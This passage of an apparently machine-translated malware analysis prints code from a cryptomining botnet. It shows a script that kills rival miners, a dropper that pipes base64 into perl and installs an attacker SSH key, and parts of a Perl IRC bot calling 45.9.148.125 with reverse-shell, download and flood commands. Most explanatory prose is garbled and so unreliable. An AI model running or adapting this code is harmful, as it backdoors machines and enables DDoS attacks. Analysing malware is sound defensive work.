    ps auxf|grep -v grep|grep <span class="hljs-string">"/var/tmp/sustes"</span> | awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
<font></font>
    ps auxf|grep xiaoyao| awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep named| awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep kernelcfg| awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep xiaoxue| awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep kernelupgrade| awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep kernelorg| awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps auxf|grep kernelupdates| awk <span class="hljs-string">'{print $2}'</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
<font></font>
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep <span class="hljs-string">"\-c"</span>|xargs <span class="hljs-built_in">kill</span> -9<font></font>
    ps ax|grep -o <span class="hljs-string">'./[0-9]* -c'</span>| xargs pkill -f<font></font>
<font></font>
    pkill -f /usr/bin/.sshd<font></font>
    pkill -f acpid<font></font>
    pkill -f AnXqV.yam<font></font>
    pkill -f apaceha<font></font>
    pkill -f askdljlqw<font></font>
    pkill -f bashe<font></font>
    pkill -f bashf<font></font>
    pkill -f bashg<font></font>
    pkill -f bashh<font></font>
    pkill -f bashx<font></font>
    pkill -f BI5zj<font></font>
    pkill -f biosetjenkins<font></font>
    pkill -f bonn.sh<font></font>
    pkill -f bonns<font></font>
    pkill -f conn.sh<font></font>
    pkill -f conns<font></font>
    pkill -f cryptonight<font></font>
    pkill -f crypto-pool<font></font>
    pkill -f ddg.2011<font></font>
    pkill -f deamon<font></font>
    pkill -f disk_genius<font></font>
    pkill -f donns<font></font>
    pkill -f Duck.sh<font></font>
    pkill -f gddr<font></font>
    pkill -f Guard.sh<font></font>
    pkill -f i586<font></font>
    pkill -f icb5o<font></font>
    pkill -f ir29xc1<font></font>
    pkill -f irqba2anc1<font></font>
    pkill -f irqba5xnc1<font></font>
    pkill -f irqbalanc1<font></font>
    pkill -f irqbalance<font></font>
    pkill -f irqbnc1<font></font>
    pkill -f JnKihGjn<font></font>
    pkill -f jweri<font></font>
    pkill -f kw.sh<font></font>
    pkill -f kworker34<font></font>
    pkill -f kxjd<font></font>
    pkill -f libapache<font></font>
    pkill -f Loopback<font></font>
    pkill -f lx26<font></font>
    pkill -f mgwsl<font></font>
    pkill -f minerd<font></font>
    pkill -f minergate<font></font>
    pkill -f minexmr<font></font>
    pkill -f mixnerdx<font></font>
    pkill -f mstxmr<font></font>
    pkill -f nanoWatch<font></font>
    pkill -f nopxi<font></font>
    pkill -f NXLAi<font></font>
    pkill -f performedl<font></font>
    pkill -f polkitd<font></font>
    pkill -f pro.sh<font></font>
    pkill -f pythno<font></font>
    pkill -f qW3xT.2<font></font>
    pkill -f sourplum<font></font>
    pkill -f stratum<font></font>
    pkill -f sustes<font></font>
    pkill -f wnTKYg<font></font>
    pkill -f XbashY<font></font>
    pkill -f XJnRj<font></font>
    pkill -f xmrig<font></font>
    pkill -f xmrigDaemon<font></font>
    pkill -f xmrigMiner<font></font>
    pkill -f ysaydh<font></font>
    pkill -f zigw<font></font>
<font></font>
    <span class="hljs-comment"># crond</span>
    ps ax | grep crond | grep -v grep | awk <span class="hljs-string">'{print $1}'</span> &gt; /tmp/crondpid
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> crondpid
    <span class="hljs-keyword">do</span>
        <span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">echo</span>  $(ps -p <span class="hljs-variable">$crondpid</span> -o %cpu | grep -v \%CPU) | sed -e <span class="hljs-string">'s/\.[0-9]*//g'</span>)  -ge 60 ]
        <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">kill</span> <span class="hljs-variable">$crondpid</span><font></font>
            rm -rf /var/tmp/v3<font></font>
        <span class="hljs-keyword">fi</span>
    <span class="hljs-keyword">done</span> &lt; /tmp/crondpid<font></font>
    rm /tmp/crondpid -f<font></font>
<font></font>
    <span class="hljs-comment"># sshd</span>
    ps ax | grep sshd | grep -v grep | awk <span class="hljs-string">'{print $1}'</span> &gt; /tmp/ssdpid
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> sshdpid
    <span class="hljs-keyword">do</span>
        <span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">echo</span>  $(ps -p <span class="hljs-variable">$sshdpid</span> -o %cpu | grep -v \%CPU) | sed -e <span class="hljs-string">'s/\.[0-9]*//g'</span>)  -ge 60 ]
        <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">kill</span> <span class="hljs-variable">$sshdpid</span>
        <span class="hljs-keyword">fi</span>
    <span class="hljs-keyword">done</span> &lt; /tmp/ssdpid<font></font>
    rm -f /tmp/ssdpid<font></font>
<font></font>
    <span class="hljs-comment"># syslog</span>
    ps ax | grep syslogs | grep -v grep | awk <span class="hljs-string">'{print $1}'</span> &gt; /tmp/syslogspid
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> syslogpid
    <span class="hljs-keyword">do</span>
        <span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">echo</span>  $(ps -p <span class="hljs-variable">$syslogpid</span> -o %cpu | grep -v \%CPU) | sed -e <span class="hljs-string">'s/\.[0-9]*//g'</span>)  -ge 60 ]
        <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">kill</span>  <span class="hljs-variable">$syslogpid</span>
        <span class="hljs-keyword">fi</span>
    <span class="hljs-keyword">done</span> &lt; /tmp/syslogspid<font></font>
    rm /tmp/syslogspid -f<font></font>
<font></font>
        ps x | grep <span class="hljs-string">'b 22'</span>| awk <span class="hljs-string">'{print $1,$5}'</span> &gt; .procs<font></font>
<font></font>
        cat .procs | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
        <span class="hljs-keyword">do</span><font></font>
<font></font>
        pid=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | awk <span class="hljs-string">'{print $1;}'</span>`<font></font>
        name=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | awk <span class="hljs-string">'{print $2;}'</span>`
        <span class="hljs-comment">#echo $pid $name </span><font></font>
<font></font>
        <span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$name</span> | wc -c) -lt <span class="hljs-string">"13"</span> ]
            <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">echo</span> <span class="hljs-string">"Found"</span> <span class="hljs-variable">$pid</span> <span class="hljs-variable">$name</span>
            <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$pid</span>
        <span class="hljs-keyword">fi</span>
        <span class="hljs-keyword">done</span><font></font>
<font></font>
        <span class="hljs-comment">####################################################</span><font></font>
<font></font>
        ps x | grep <span class="hljs-string">'d 22'</span>| awk <span class="hljs-string">'{print $1,$5}'</span> &gt; .procs<font></font>
<font></font>
        cat .procs | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
        <span class="hljs-keyword">do</span><font></font>
<font></font>
        pid=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | awk <span class="hljs-string">'{print $1;}'</span>`<font></font>
        name=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | awk <span class="hljs-string">'{print $2;}'</span>`
        <span class="hljs-comment">#echo $pid $name </span><font></font>
<font></font>
        <span class="hljs-keyword">if</span> [ $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$name</span> | wc -c) -lt <span class="hljs-string">"13"</span> ]
            <span class="hljs-keyword">then</span>
            <span class="hljs-built_in">echo</span> <span class="hljs-string">"Found"</span> <span class="hljs-variable">$pid</span> <span class="hljs-variable">$name</span>
            <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$pid</span>
        <span class="hljs-keyword">fi</span>
        <span class="hljs-keyword">done</span><font></font>
<font></font>
}<font></font>
<font></font>
<span class="hljs-comment"># Removing miners by known path IOC</span>
<span class="hljs-function"><span class="hljs-title">files</span></span>(){<font></font>
    rm /tmp/.cron<font></font>
    rm /tmp/.main<font></font>
    rm /tmp/.yam* -rf<font></font>
    rm -f /tmp/irq<font></font>
    rm -f /tmp/irq.sh<font></font>
    rm -f /tmp/irqbalanc1<font></font>
    rm -rf /boot/grub/deamon &amp;&amp; rm -rf /boot/grub/disk_genius<font></font>
    rm -rf /tmp/*httpd.conf<font></font>
    rm -rf /tmp/*httpd.conf*<font></font>
    rm -rf /tmp/*index_bak*<font></font>
    rm -rf /tmp/.systemd-private-*<font></font>
    rm -rf /tmp/.xm*<font></font>
    rm -rf /tmp/a7b104c270<font></font>
    rm -rf /tmp/conn<font></font>
    rm -rf /tmp/conns<font></font>
    rm -rf /tmp/httpd.conf<font></font>
    rm -rf /tmp/java*<font></font>
    rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/<span class="hljs-built_in">local</span>/lib/libjdk.so<font></font>
    rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik<font></font>
    rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache<font></font>
    rm -rf /tmp/xm*<font></font>
    rm -rf /var/tmp/java*<font></font>
}<font></font>
<font></font>
<span class="hljs-comment"># Killing and blocking miners by network related IOC</span>
<span class="hljs-function"><span class="hljs-title">network</span></span>(){
    <span class="hljs-comment"># Kill by known ports/IPs</span>
    netstat -anp | grep 69.28.55.86:443 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep 185.71.65.238 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep 140.82.52.87 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :443 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :23 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :443 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :143 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :2222 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :3333 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :3389 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :4444 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :5555 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :6666 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :6665 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :6667 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :7777 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :8444 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :3347 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :14444 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :14433 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
    netstat -anp | grep :13531 |awk <span class="hljs-string">'{print $7}'</span>| awk -F<span class="hljs-string">'[/]'</span> <span class="hljs-string">'{print $1}'</span> | xargs <span class="hljs-built_in">kill</span> -9<font></font>
}   <font></font>
<font></font>
files<font></font>
processes<font></font>
network<font></font>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"DONE"</span></code></pre></div></div><br>
<h3 id="shellbot"></h3><br>
<p>  <code>.rsync/b/run</code>       base64   -  perl,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"> </a>.     ssh           .</p><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text"><pre><code class="bash hljs"><span class="hljs-meta">#!/bin/sh</span><font></font>
nohup ./stop&gt;&gt;/dev/null &amp;<font></font>
sleep 5<font></font>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"&lt;base64&gt;"</span> | base64 --decode | perl
<span class="hljs-built_in">cd</span> ~ &amp;&amp; rm -rf .ssh &amp;&amp; mkdir .ssh &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"</span>&gt;&gt;.ssh/authorized_keys &amp;&amp; chmod -R go= ~/.ssh</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title">   perl</b><div class="spoiler_text"><pre><code class="perl hljs"><span class="hljs-keyword">my</span> $processo = <span class="hljs-string">'rsync'</span>;<font></font>
<font></font>
$servidor=<span class="hljs-string">'45.9.148.125'</span> <span class="hljs-keyword">unless</span> $servidor;
<span class="hljs-keyword">my</span> $porta=<span class="hljs-string">'443'</span>;<font></font>
<font></font>
<span class="hljs-keyword">my</span> $VERSAO = <span class="hljs-string">'0.2a'</span>;<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">parse</span> </span>{
   <span class="hljs-keyword">my</span> $servarg = <span class="hljs-keyword">shift</span>;
   <span class="hljs-keyword">if</span> ($servarg =~ <span class="hljs-regexp">/^PING \:(.*)/</span>) {<font></font>
     sendraw(<span class="hljs-string">"PONG :$1"</span>);<font></font>
   } <span class="hljs-keyword">elsif</span> ($servarg =~ <span class="hljs-regexp">/^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/</span>) {
       <span class="hljs-keyword">my</span> $pn=$1; <span class="hljs-keyword">my</span> $onde = $4; <span class="hljs-keyword">my</span> $args = $5;
       <span class="hljs-keyword">if</span> ($args =~ <span class="hljs-regexp">/^\001VERSION\001$/</span>) {<font></font>
         notice(<span class="hljs-string">"$pn"</span>, <span class="hljs-string">"\001VERSION mIRC v6.16 ENE ALIN GABRIEL\001"</span>);<font></font>
       }<font></font>
       <span class="hljs-keyword">elsif</span> ($args =~ <span class="hljs-regexp">/^\001PING\s+(\d+)\001$/</span>) {<font></font>
         notice(<span class="hljs-string">"$pn"</span>, <span class="hljs-string">"\001PONG\001"</span>);<font></font>
       }<font></font>
       <span class="hljs-keyword">elsif</span> (<span class="hljs-keyword">grep</span> {$_ =~ <span class="hljs-regexp">/^\Q$pn\E$/i</span> } @adms) {
         <span class="hljs-keyword">if</span> ($onde eq <span class="hljs-string">"$meunick"</span>){<font></font>
           shell(<span class="hljs-string">"$pn"</span>, <span class="hljs-string">"$args"</span>);<font></font>
           }<font></font>
         <span class="hljs-keyword">elsif</span> ($args =~ <span class="hljs-regexp">/^(\Q$meunick\E|\Q$prefixo\E)\s+(.*)/</span> ) {
            <span class="hljs-keyword">my</span> $natrix = $1;
            <span class="hljs-keyword">my</span> $arg = $2;
            <span class="hljs-keyword">if</span> ($arg =~ <span class="hljs-regexp">/^\!(.*)/</span>) {<font></font>
              ircase(<span class="hljs-string">"$pn"</span>,<span class="hljs-string">"$onde"</span>,<span class="hljs-string">"$1"</span>) <span class="hljs-keyword">unless</span> ($natrix eq <span class="hljs-string">"$prefixo"</span> <span class="hljs-keyword">and</span> $arg =~ <span class="hljs-regexp">/^\!nick/</span>);<font></font>
            } <span class="hljs-keyword">elsif</span> ($arg =~ <span class="hljs-regexp">/^\@(.*)/</span>) {<font></font>
                $ondep = $onde;<font></font>
                $ondep = $pn <span class="hljs-keyword">if</span> $onde eq $meunick;<font></font>
                bfunc(<span class="hljs-string">"$ondep"</span>,<span class="hljs-string">"$1"</span>);<font></font>
            } <span class="hljs-keyword">else</span> {<font></font>
                shell(<span class="hljs-string">"$onde"</span>, <span class="hljs-string">"$arg"</span>);<font></font>
            }<font></font>
         }<font></font>
       }<font></font>
   } <span class="hljs-keyword">elsif</span> ($servarg =~ <span class="hljs-regexp">/^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i</span>) {
       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">lc</span>($1) eq <span class="hljs-keyword">lc</span>($meunick)) {<font></font>
         $meunick=$4;<font></font>
         $irc_servers{$IRC_cur_socket}{<span class="hljs-string">'nick'</span>} = $meunick;<font></font>
       }<font></font>
   } <span class="hljs-keyword">elsif</span> ($servarg =~ <span class="hljs-regexp">m/^\:(.+?)\s+433/i</span>) {<font></font>
       $meunick = getnick();<font></font>
       nick(<span class="hljs-string">"$meunick"</span>);<font></font>
   } <span class="hljs-keyword">elsif</span> ($servarg =~ <span class="hljs-regexp">m/^\:(.+?)\s+001\s+(\S+)\s/i</span>) {<font></font>
       $meunick = $2;<font></font>
       $irc_servers{$IRC_cur_socket}{<span class="hljs-string">'nick'</span>} = $meunick;<font></font>
       $irc_servers{$IRC_cur_socket}{<span class="hljs-string">'nome'</span>} = <span class="hljs-string">"$1"</span>;
       <span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $canal (@canais) {<font></font>
         sendraw(<span class="hljs-string">"JOIN $canal"</span>);<font></font>
       }<font></font>
   }<font></font>
}<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">bfunc</span> </span>{
  <span class="hljs-keyword">my</span> $printl = $_[<span class="hljs-number">0</span>];
  <span class="hljs-keyword">my</span> $funcarg = $_[<span class="hljs-number">1</span>];
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">my</span> $pid = <span class="hljs-keyword">fork</span>) {
     <span class="hljs-keyword">waitpid</span>($pid, <span class="hljs-number">0</span>);<font></font>
  } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">fork</span>) {
         <span class="hljs-keyword">exit</span>;<font></font>
       } <span class="hljs-keyword">else</span> {
           <span class="hljs-keyword">if</span> ($funcarg =~ <span class="hljs-regexp">/^portscan (.*)/</span>) {
             <span class="hljs-keyword">my</span> $hostip=<span class="hljs-string">"$1"</span>;
             <span class="hljs-keyword">my</span> @portas=(<span class="hljs-string">"21"</span>,<span class="hljs-string">"22"</span>,<span class="hljs-string">"23"</span>,<span class="hljs-string">"25"</span>,<span class="hljs-string">"53"</span>,<span class="hljs-string">"80"</span>,<span class="hljs-string">"110"</span>,<span class="hljs-string">"143"</span>,<span class="hljs-string">"6665"</span>);
             <span class="hljs-keyword">my</span> (@aberta, %porta_banner);<font></font>
             ....<font></font>
           }<font></font>
<font></font>
           <span class="hljs-keyword">elsif</span> ($funcarg =~ <span class="hljs-regexp">/^download\s+(.*)\s+(.*)/</span>) {<font></font>
            getstore(<span class="hljs-string">"$1"</span>, <span class="hljs-string">"$2"</span>);<font></font>
            sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :Download de $2 ($1) Conclu.do!"</span>) <span class="hljs-keyword">if</span> ($estatisticas);<font></font>
            }<font></font>
<font></font>
           <span class="hljs-keyword">elsif</span> ($funcarg =~ <span class="hljs-regexp">/^fullportscan\s+(.*)\s+(\d+)\s+(\d+)/</span>) {
             <span class="hljs-keyword">my</span> $hostname=<span class="hljs-string">"$1"</span>;
             <span class="hljs-keyword">my</span> $portainicial = <span class="hljs-string">"$2"</span>;
             <span class="hljs-keyword">my</span> $portafinal = <span class="hljs-string">"$3"</span>;
             <span class="hljs-keyword">my</span> (@abertas, %porta_banner);<font></font>
             ...<font></font>
            }<font></font>
<font></font>
            <span class="hljs-keyword">elsif</span> ($funcarg =~ <span class="hljs-regexp">/^udp\s+(.*)\s+(\d+)\s+(\d+)/</span>) {
              <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> $pacotes;
              <span class="hljs-keyword">socket</span>(Tr0x, PF_INET, SOCK_DGRAM, <span class="hljs-number">17</span>);
              <span class="hljs-keyword">my</span> $alvo=inet_aton(<span class="hljs-string">"$1"</span>);
              <span class="hljs-keyword">my</span> $porta = <span class="hljs-string">"$2"</span>;
              <span class="hljs-keyword">my</span> $tempo = <span class="hljs-string">"$3"</span>;
              <span class="hljs-keyword">my</span> $pacote;
              <span class="hljs-keyword">my</span> $pacotese;
              <span class="hljs-keyword">my</span> $fim = <span class="hljs-keyword">time</span> + $tempo;
              <span class="hljs-keyword">my</span> $pacota = <span class="hljs-number">1</span>;<font></font>
              ...<font></font>
            }<font></font>
<font></font>
            <span class="hljs-keyword">elsif</span> ($funcarg =~ <span class="hljs-regexp">/^udpfaixa\s+(.*)\s+(\d+)\s+(\d+)/</span>) {
              <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> $pacotes;
              <span class="hljs-keyword">socket</span>(Tr0x, PF_INET, SOCK_DGRAM, <span class="hljs-number">17</span>);
              <span class="hljs-keyword">my</span> $faixaip=<span class="hljs-string">"$1"</span>;
              <span class="hljs-keyword">my</span> $porta = <span class="hljs-string">"$2"</span>;
              <span class="hljs-keyword">my</span> $tempo = <span class="hljs-string">"$3"</span>;
              <span class="hljs-keyword">my</span> $pacote;
              <span class="hljs-keyword">my</span> $pacotes;
              <span class="hljs-keyword">my</span> $fim = <span class="hljs-keyword">time</span> + $tempo;
              <span class="hljs-keyword">my</span> $pacota = <span class="hljs-number">1</span>;
              <span class="hljs-keyword">my</span> $alvo;<font></font>
              ...<font></font>
              <span class="hljs-keyword">if</span> ($estatisticas)<font></font>
              {<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Tempo de Pacotes\002: $tempo"</span>.<span class="hljs-string">"s"</span>);<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Total de Pacotes\002: $pacotese"</span>);<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Alvo dos Pacotes\002: $alvo"</span>);<font></font>
              }<font></font>
            }<font></font>
<font></font>
            <span class="hljs-keyword">elsif</span> ($funcarg =~ <span class="hljs-regexp">/^conback\s+(.*)\s+(\d+)/</span>) {
              <span class="hljs-keyword">my</span> $host = <span class="hljs-string">"$1"</span>;
              <span class="hljs-keyword">my</span> $porta = <span class="hljs-string">"$2"</span>;
              <span class="hljs-keyword">my</span> $proto = <span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">'tcp'</span>);
              <span class="hljs-keyword">my</span> $iaddr = inet_aton($host);
              <span class="hljs-keyword">my</span> $paddr = sockaddr_in($porta, $iaddr);
              <span class="hljs-keyword">my</span> $shell = <span class="hljs-string">"/bin/sh -i"</span>;
              <span class="hljs-keyword">if</span> ($^O eq <span class="hljs-string">"MSWin32"</span>) {<font></font>
                $shell = <span class="hljs-string">"cmd.exe"</span>;<font></font>
              }<font></font>
              ...<font></font>
<font></font>
              <span class="hljs-keyword">if</span> ($estatisticas)<font></font>
              {<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Conectando-se em\002: $host:$porta"</span>);<font></font>
              }<font></font>
            }<font></font>
<font></font>
           <span class="hljs-keyword">elsif</span> ($funcarg =~ <span class="hljs-regexp">/^oldpack\s+(.*)\s+(\d+)\s+(\d+)/</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> $pacotes;
             <span class="hljs-keyword">my</span> ($dtime, %pacotes) = attacker(<span class="hljs-string">"$1"</span>, <span class="hljs-string">"$2"</span>, <span class="hljs-string">"$3"</span>);<font></font>
             $dtime = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> $dtime == <span class="hljs-number">0</span>;
             <span class="hljs-keyword">my</span> %bytes;<font></font>
             $bytes<span class="hljs-string">{igmp}</span> = $2 * $pacotes<span class="hljs-string">{igmp}</span>;<font></font>
             $bytes<span class="hljs-string">{icmp}</span> = $2 * $pacotes<span class="hljs-string">{icmp}</span>;<font></font>
             $bytes<span class="hljs-string">{o}</span> = $2 * $pacotes<span class="hljs-string">{o}</span>;<font></font>
             $bytes<span class="hljs-string">{udp}</span> = $2 * $pacotes<span class="hljs-string">{udp}</span>;<font></font>
             $bytes<span class="hljs-string">{tcp}</span> = $2 * $pacotes<span class="hljs-string">{tcp}</span>;
             <span class="hljs-keyword">unless</span> ($estatisticas)<font></font>
             {<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002 - Status -\002"</span>);<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Timp\002: $dtime"</span>.<span class="hljs-string">"secunde."</span>);<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Total packet\002: "</span>.($pacotes<span class="hljs-string">{udp}</span> + $pacotes<span class="hljs-string">{igmp}</span> + $pacotes<span class="hljs-string">{icmp}</span> +  $pacotes<span class="hljs-string">{o}</span>));<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Total bytes\002: "</span>.($bytes<span class="hljs-string">{icmp}</span> + $bytes <span class="hljs-string">{igmp}</span> + $bytes<span class="hljs-string">{udp}</span> + $bytes<span class="hljs-string">{o}</span>));<font></font>
               sendraw($IRC_cur_socket, <span class="hljs-string">"PRIVMSG $printl :\002Flood\002: "</span>.int((($bytes<span class="hljs-string">{icmp}</span>+$bytes<span class="hljs-string">{igmp}</span>+$bytes<span class="hljs-string">{udp}</span> + $bytes<span class="hljs-string">{o}</span>)/<span class="hljs-number">1024</span>)/$dtime).<span class="hljs-string">" kbps"</span>);<font></font>
             }<font></font>
           }<font></font>
           <span class="hljs-keyword">exit</span>;<font></font>
       }<font></font>
  }<font></font>
}</code></pre></div></div><br>
<p>   ,     IRC  <code>45.9.148.125:443</code>.  .   </p><br>
<ul>
<li> Shell ,   ,  ..   Win32</li>
<li>   "21","22","23","25","53","80","110","143","6665"  </li>
<li>  url   </li>
<li>    </li>
<li>UDP       </li>
<li>UDP      </li>
<li>  TCP   </li>
<li>   igmp, udp, icmp, tcp      </li>
</ul><br>
